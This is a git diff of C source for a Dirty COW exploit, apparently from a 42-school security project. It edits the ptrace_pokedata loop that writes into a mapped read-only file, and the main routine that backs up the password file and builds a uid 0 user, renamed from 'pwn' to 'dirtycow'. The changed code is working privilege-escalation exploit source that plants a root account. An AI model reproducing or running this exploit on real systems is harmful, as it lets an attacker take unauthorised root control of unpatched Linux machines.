@@ -6,7 +6,7 @@
 /*   By: ciglesia <ciglesia@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/03/05 14:55:03 by ciglesia          #+#    #+#             */
-/*   Updated: 2023/03/05 17:59:12 by ciglesia         ###   ########.fr       */
+/*   Updated: 2023/03/05 19:26:39 by ciglesia         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
@@ -107,7 +107,7 @@ void	dirtycow(char *line_to_write)
 			   f,
 			   0
 		);
-	printf("mmap: %lx\n\e[?25l",(unsigned long)map);
+	printf("mmap: %lx\n\e[?25l\n",(unsigned long)map);
 	pid = fork();
 	if (pid)
 	{
@@ -118,6 +118,8 @@ void	dirtycow(char *line_to_write)
 		while (i < 10000 / l)                    // 10k devided by l
 		{
 			o = 0;
+			printf("Injecting memory [%.3d/%.3d]\r", i, (int)(10000 / l));
+			fflush(stdout);
 			while (o < l)                        // for each byte
 			{
 				u = 0;
@@ -127,9 +129,6 @@ void	dirtycow(char *line_to_write)
 								pid,
 								map + o,
 								*((long*)(line_to_write + o)));
-					printf("Injecting into memory [%.3d/%.3d] (byte: %.3d/%.3d) (%.5d/%.5d)\r",
-						   i, (int)(10000 / l), o, l, u, 10000);
-					fflush(stdout);
 					u++;
 				}
 				o++;
@@ -159,7 +158,7 @@ int main(int ac, char **av)
 	{
 		if (copy_file(PWDFILE, PWDBKP) != 0)
 			return (1);
-		user.username = "pwn";
+		user.username = "dirtycow";
 		user.user_id = 0;
 		user.group_id = 0;
 		user.info = "pwned";
